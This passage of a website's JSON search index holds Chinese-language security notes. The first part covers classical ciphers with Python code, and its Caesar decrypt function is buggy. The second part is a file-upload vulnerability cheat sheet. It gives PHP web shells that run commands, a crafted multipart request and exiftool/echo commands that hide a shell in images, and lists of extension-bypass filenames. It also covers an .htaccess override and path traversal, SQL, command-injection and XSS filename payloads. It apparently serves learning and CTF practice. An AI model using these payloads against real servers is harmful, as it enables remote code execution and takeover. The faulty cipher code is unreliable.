\\frac{\\sum_{i=1}^{c}n_{i}(n_{i}-1)}{N(N-1)} $$\n$c$:字母表的長度（英文為26）\n$N$:指文本的長度\n$n_1$~$n_c$:密文的字母頻率，為整數\n密鑰長度約為: $${\\kappa _{p}-\\kappa _{r}} \\over {\\kappa _{o}-\\kappa _{r}}$$ ${\\kappa _{p}}$:兩個任意字母相同的概率\n${\\kappa _{r}}$:字母表中這種情況出現的概率（英文中為1/26=0.0385)\n頻率分析，一旦確定密鑰長度，可以把密文分成和密鑰長度相等的列數，一列相等於一組凱薩密碼，透過頻率分析可以獲得明文 實作 #\ralphabet = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39; def encrypt(plaintext:str, key:int)-\u0026gt;str: cipher = \u0026#34;\u0026#34; for ch in plaintext.upper(): if ch.isalpha(): pos = alphabet.index(ch) ch = alphabet[(pos + key) % 26] cipher += ch return cipher def decrypt(cipher:str, key:int)-\u0026gt;str: plaintext = \u0026#34;\u0026#34; for ch in cipher.upped(): if ch.isalpha(): pos = alphabet.index(ch) ch = alphabet[(pos + key) % 26] plaintext += ch return plaintext if __name__ == \u0026#39;__main__\u0026#39;: cipher = encrypt(\u0026#39;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG\u0026#39;, 13) plaintext = decrypt(cipher, 13) print(cipher) print(plaintext) Simple Substitution Cipher(簡易替換密碼) #\r又稱Monoalphabetic Cipher(單表加密)\n用一張改變順序後的字母表，並以該字母表書寫\n即可稱為簡易替換密碼，像是凱薩加密、仿射加密都算\n加密 #\r把明文的每個字母替換成對照表對應的字母\n項目 值 明文 THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG 密鑰 GHAWQYKIJBXSTUVFOPCDRNMEZL 密文 DIQ ORJAX HPVMU YVE BRTFC VNQP DIQ SGLZ WVK 解密 #\r反過來做就好了，也可以使用quip qiup爆破\n實作 #\ralphabet = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39; def encrypt(plaintext:str, key:str)-\u0026gt;str: cipher = \u0026#34;\u0026#34; for ch in plaintext.upper(): if ch.isalpha(): pos = alphabet.index(ch) ch = key[pos] cipher += ch return cipher def decrypt(cipher:str, key:str)-\u0026gt;str: plaintext = \u0026#34;\u0026#34; for ch in cipher.upper(): if ch.isalpha(): pos = key.index(ch) ch = alphabet[pos] plaintext += ch return plaintext if __name__ == \u0026#39;__main__\u0026#39;: key = \u0026#39;GHAWQYKIJBXSTUVFOPCDRNMEZL\u0026#39; cipher = encrypt(\u0026#39;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG\u0026#39;, key) plaintext = decrypt(cipher, key) print(cipher) print(plaintext) Affine Cipher(仿射密碼) #\r加密 #\r$$ a,m互質 $$ $$ E(x)=ax+b{\\pmod {m}} $$\n項目 值 明文 THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG 密鑰 a=15, b=3 密文 CEL JRTHX SYFVQ AFK IRBUN FGLY CEL MDOZ WFP 證明加密的可行性: $E(x)$為單射函數 $$ E(x_1) = E(x_2) $$ $$ ax_1+b \\equiv ax_2+b{\\pmod {m}} $$ $$ ax_1 \\equiv ax_2{\\pmod {m}} $$ $$ x_1 \\equiv x_2{\\pmod {m}} $$ $$ x_1 = x_2(不超過字母表範圍) $$\n解密 #\r$$ D(x)=a^{-1}(x-b){\\pmod {m}}$$ $$ a^{-1} 為a對m之模倒數，\\text{python中可以使用pow(a,-1,m)計算} $$\n解密原理: $$ D(x)=a^{-1}(E(x)-b){\\pmod {m}}$$ $$ D(x)=a^{-1}(ax+b-b){\\pmod {m}}$$ $$ D(x)=a^{-1}a^{1}x{\\pmod {m}}$$ $$ D(x)=x{\\pmod {m}}$$\n也可以使用quip qiup爆破\n實作 #\ralphabet = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39; def encrypt(plaintext:str, a:int, b:int)-\u0026gt;str: cipher = \u0026#34;\u0026#34; for ch in plaintext: if ch.isalpha(): pos = alphabet.index(ch.upper()) ch = alphabet[(pos * a + b) % 26] cipher += ch return cipher def decrypt(cipher:str, a:int, b:int)-\u0026gt;str: plaintext = \u0026#34;\u0026#34; inv = pow(a, -1, 26) for ch in cipher: if ch.isalpha(): pos = alphabet.index(ch.upper()) ch = alphabet[(pos - b) * inv % 26] plaintext += ch return plaintext if __name__ == \u0026#39;__main__\u0026#39;: cipher = encrypt(\u0026#39;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG\u0026#39;, 15, 3) plaintext = decrypt(cipher, 15, 3) print(cipher) print(plaintext) Playfair Cipher #\r加密 #\r密鑰產生\n選取一個英文字作密鑰 除去重覆出現的字母 將密鑰的字母逐個逐個加入5×5的矩陣內，剩下的空間將未加入的英文字母依a-z的順序加入（將Q去除，或將I和J視作同一字） 假設密鑰為PLAYFAIR EXAMPLE\n預處理\n將每兩個字母分成一組，若是同組字母一樣，在兩字母之間插入X或Q，重新分組，若剩下一個字，在尾端補上X\nHide the gold in the tree stump -\u0026gt;HI DE TH EG OL DI NT HE TR EX ES TU MP\n加密\n找出組中兩個字母的位置\n字母不同行不同列，取對角的字元\n字母同行，取兩字母右方之字元\n字母同列，取兩字母下方之字元\n項目 值 明文 HIDE THE GOLD IN THE TREE STUMP 密鑰 PLAYFAIR EXAMPLE 密文 BM OD ZB XD NA BE KU DM UI XM MO UV IF 解密 #\r將加密過程反過來操作即可，但字元會因為經過預處理過的關係，導致和明文有所偏差\n實作 #\rdef gen_key(key:int): key = key.replace(\u0026#39;J\u0026#39;, \u0026#39;I\u0026#39;) matrix = [] used = set() for ch in key.upper(): if ch not in used and ch.isalpha(): matrix.append(ch) used.add(ch) for ch in \u0026#34;ABCDEFGHIKLMNOPQRSTUVWXYZ\u0026#34;: if ch not in used: matrix.append(ch) used.add(ch) return [matrix[i:i+5] for i in range(0, 25, 5)] def find_position(matrix:list, ch:str): for y in range(5): for x in range(5): if matrix[y][x] == ch: return y, x return None def preprocess_text(text:str): text = text.replace(\u0026#39;J\u0026#39;, \u0026#39;I\u0026#39;).upper().replace(\u0026#39; \u0026#39;, \u0026#39;\u0026#39;) processed = \u0026#34;\u0026#34; i = 0 while i \u0026lt; len(text): ch = text[i] ch2 = text[i+1] if i+1 \u0026lt; len(text) else \u0026#39;X\u0026#39; if ch == ch2: processed += ch processed += \u0026#39;X\u0026#39; i += 1 else: processed += ch processed += ch2 i += 2 return processed def encrypt(plaintext:str, key:str): matrix = gen_key(key) plaintext = preprocess_text(plaintext) cipher = [] for i in range(0, len(plaintext), 2): ch1, ch2 = plaintext[i], plaintext[i+1] y1, x1 = find_position(matrix, ch1) y2, x2 = find_position(matrix, ch2) if y1 == y2: cipher += matrix[y1][(x1 + 1) % 5] cipher += matrix[y2][(x2 + 1) % 5] elif x1 == x2: cipher += matrix[(y1 + 1) % 5][x1] cipher += matrix[(y2 + 1) % 5][x2] else: cipher += matrix[y1][x2] cipher += matrix[y2][x1] return \u0026#39;\u0026#39;.join(cipher) def decrypt(cipher, key): matrix = gen_key(key) plaintext = [] for i in range(0, len(cipher), 2): y1, x1 = find_position(matrix, cipher[i]) y2, x2 = find_position(matrix, cipher[i+1]) if y1 == y2: plaintext.append(matrix[y1][(x1 - 1) % 5]) plaintext.append(matrix[y2][(x2 - 1) % 5]) elif x1 == x2: plaintext.append(matrix[(y1 - 1) % 5][x1]) plaintext.append(matrix[(y2 - 1) % 5][x2]) else: plaintext.append(matrix[y1][x2]) plaintext.append(matrix[y2][x1]) return \u0026#39;\u0026#39;.join(plaintext) if __name__ == \u0026#39;__main__\u0026#39;: cipher = encrypt(\u0026#39;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG\u0026#39;, \u0026#39;PLAYFAIR EXAMPLE\u0026#39;) plaintext = decrypt(cipher, \u0026#39;PLAYFAIR EXAMPLE\u0026#39;) print(cipher) print(plaintext) Transposition Cipher(替換式加密) #\r字母不變，依某個順序替換每個字母的位置\nScytale Cipher(密碼棒) #\r加密 #\r把字條綁在指定寬度的木棒上，並橫著書寫文字\n項目 值 明文 THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG 密鑰 5 密文 TUB J LDHIRFUOTAOECOOMVHZG KWXPEEY Q N SR 解密 #\r把紙條綁在指定寬度的木棒上，橫著閱讀文字，很容易爆破\n實作 #\rdef encrypt(plaintext, key): plaintext += \u0026#39; \u0026#39; * (-len(plaintext) % key) cipher = [\u0026#39;\u0026#39;] * key for i, ch in enumerate(plaintext): cipher[i % key] += ch return \u0026#39;\u0026#39;.join(cipher) def decrypt(cipher, key): cipher += \u0026#39; \u0026#39; * (-len(cipher) % key) row = len(cipher) // key plaintext = [\u0026#39;\u0026#39;] * row for i, ch in enumerate(cipher): plaintext[i % row] += ch return \u0026#39;\u0026#39;.join(plaintext) if __name__ == \u0026#39;__main__\u0026#39;: cipher = encrypt(\u0026#39;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG\u0026#39;, 5) plaintext = decrypt(cipher, 5) print(cipher.encode()) print(plaintext) Railfence Cipher #\r加密 #\r如上圖，把文字依這種格式排列\n並橫著書寫文字\n項目 值 明文 THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG 密鑰 5 密文 TKFSHDHC OP TE OEIBNXMO YG URW UVRLZQOJEA 解密 #\r推算回書寫的格式，並依照上圖順序閱讀，很容易爆破\n實作 #\rdef encrypt(plaintext:str, key:int)-\u0026gt;str: rails = [\u0026#39;\u0026#39;] * key rail = 0 dir = 1 for char in plaintext: rails[rail] += char if rail == 0: dir = 1 elif rail == key - 1: dir = -1 rail += dir return \u0026#39;\u0026#39;.join(rails) def decrypt(ciphertext:str, key:int): rails = [[] for _ in range(key)] rail_len = [0] * key rail = 0 dir = 1 for i in range(len(ciphertext)): rail_len[rail] += 1 if rail == 0: dir = 1 elif rail == key - 1: dir = -1 rail += dir idx = 0 for i in range(key): rails[i] = list(ciphertext[idx:idx + rail_len[i]]) idx += rail_len[i] decrypted_text = [] rail = 0 dir = 1 for i in range(len(ciphertext)): decrypted_text.append(rails[rail].pop(0)) if rail == 0: dir = 1 elif rail == key - 1: dir = -1 rail += dir return \u0026#39;\u0026#39;.join(decrypted_text) if __name__ == \u0026#39;__main__\u0026#39;: cipher = encrypt(\u0026#39;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG\u0026#39;, 5) plaintext = decrypt(cipher, 5) print(cipher) print(plaintext) Route Cipher #\r加密 #\r將明文再給定尺寸的網格寫下，在依照特定的路徑讀取字母\n項目 值 明文 WE ARE DISCOVERED FLEE AT ONCE 密鑰 「從右上角開始，順時針向內螺旋讀取」 密文 EJXCTEDEC DAEWRIORF EONALEVSE 解密 #\r依照密鑰的指令，反方向寫回給定尺寸的網格\n","externalUrl":null,"permalink":"/notes/crypto/classical-cipher/","section":"Notes","summary":"Intro #\r因為不想一直通靈所以打算做一篇古典密碼的筆記","title":"Classical Cipher","type":"notes"},{"content":"","externalUrl":null,"permalink":"/notes/crypto/","section":"Notes","summary":"","title":"Crypto","type":"notes"},{"content":"文件上傳漏洞是指用戶上傳可能會造成危害的檔案(廢話\n伺服器如何處理靜態檔案的Request #\r檔案路徑 #\r傳統的網站會把檔案的request，1:1的映射到自己的檔案路徑，如：\nGET /files/avatars/profile.png HTTP/1.1 profile.png 的絕對位置可能為/var/www/html/files/avatars/profile.png\n回傳的檔案內容 #\r如果檔案類型為non-executable：伺服器會回傳檔案的內容 如果檔案類型為excutable：伺服器會把request的header和parameter指派給對應的變數，並回傳執行的結果輸出 如果檔案類型為excutable，但伺服器沒有設定要執行：大部分情況下會回傳error，但少部分情況會回傳檔案內容回來 Web Shell #\r如果使用者可以執行上傳的檔案，那麼這些檔案內容會造成危害\n任意讀取檔案 #\r\u0026lt;?php echo file_get_contents(\u0026#39;/path/to/target/file\u0026#39;); ?\u0026gt; 執行指令 #\r\u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; 用這樣的方式可以傳遞parameter給web shell：\nGET /example.com/exploit.php?command=id HTTP/1.1 Bypassing #\rContent-Type #\r若是伺服器使用Content-Type驗證檔案\nPOST /images HTTP/1.1 Host: example.com Content-Length: 12345 Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456 ---------------------------012345678901234567890123456 Content-Disposition: form-data; name=\u0026#34;image\u0026#34;; filename=\u0026#34;exploit.php\u0026#34; Content-Type: image/png \u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; ---------------------------012345678901234567890123456 Content-Disposition: form-data; name=\u0026#34;username\u0026#34; user ---------------------------012345678901234567890123456-- 將Content-Type改成image/png或其他\nmagic number #\r伺服器驗證檔案的header\n利用exiftool:\nexiftool -Comment=\u0026#34;\u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt;\u0026#34; img.jpg 利用linux:\necho \u0026#39;\u0026lt;?php system($_REQUEST[\u0026#39;cmd\u0026#39;]); ?\u0026gt;\u0026#39; \u0026gt;\u0026gt; img.png 副檔名驗證 #\r如果遇到副檔名被擋的情況\n使用其他副檔名 #\r以下副檔名之檔案為executable\nPHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module Working in PHPv8: .php, .php4, .php5, .phtml, .module, .inc, .hphp, .ctp ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml Jsp: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action Coldfusion: .cfm, .cfml, .cfc, .dbm Flash: .swf Perl: .pl, .cgi Erlang Yaws Web Server: .yaws 更改大小寫 #\rexploit.pHP\n在增加更多副檔名層級 #\rexploit.png.php exploit.php.png exploit.php%00.png%00.jpg\n副檔名尾端加入特殊字元 #\rexploit.php%20 exploit.php%0a exploit.php%00 exploit.php%0d%0a exploit.php/ exploit.php.\\ exploit. exploit.php.... exploit.pHp5.... 混淆副檔名parser #\r使用多個副檔名、特殊字元和填充多個null byte混淆副檔名parser\nexploit.png.php exploit.png.pHp5 exploit.php#.png exploit.php%00.png exploit.php\\x00.png exploit.php%0a.png exploit.php%0d%0a.png exploit.phpJunk123png 突破檔案名稱長度上限 #\rpython -c 'print \u0026quot;A\u0026quot; * 232' + .php.jpg\n繞過反繞過 #\rexploit.p.phphp\nOverriding The Server Configuration #\rApache #\r檢查/etc/apache2/apache2.conf(或httpd.conf)，確保server有允許使用.htaccess: \u0026lt;Directory /path/to/your/directory\u0026gt; AllowOverride All \u0026lt;/Directory\u0026gt; 上傳.htaccess於目前資料夾:\nAddType application/x-httpd-php evil\n上傳expoilt.evil，理論上會被當作php執行\nFilename Tricks #\rpath travelsal #\r伺服器解析後檔案可能上傳於上層目錄\n..%2Fexploit.php\nSQL injection #\r此payload可以暫停延遲10秒的sql\nsleep(10)-- -.jpg\ncommand injection #\r; sleep 10;\nXSS #\r\u0026lt;svg onload=alert(1)\u0026gt;\nReference #\rHackTricks Port Swigger ","externalUrl":null,"permalink":"/notes/web/file-upload-vulnerbility/","section":"Notes","summary":"文件上傳漏洞是指用戶上傳可能會造成危害的檔案(廢話","title":"File Upload Vulnerability","type":"notes"},{"content":"","externalUrl":null,"permalink":"/notes/misc/","section":"Notes","summary":"","title":"Misc","type":"notes"},{"content":"","externalUrl":null,"permalink":"/notes/others/","section":"Notes","summary":"","title":"Others","type":"notes"},{"content":"","externalUrl":null,"permalink":"/notes/pwn/","section":"Notes","summary":"","title":"Pwn","type":"notes"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","externalUrl":null,"permalink":"/notes/tools/","section":"Notes","summary":"","title":"Tools","type":"notes"},{"content":"","externalUrl":null,"permalink":"/topics/","section":"Topics","summary":"","title":"Topics","type":"topics"},{"content":"","externalUrl":null,"permalink":"/notes/web/","section":"Notes","summary":"","title":"Web","type":"notes"}]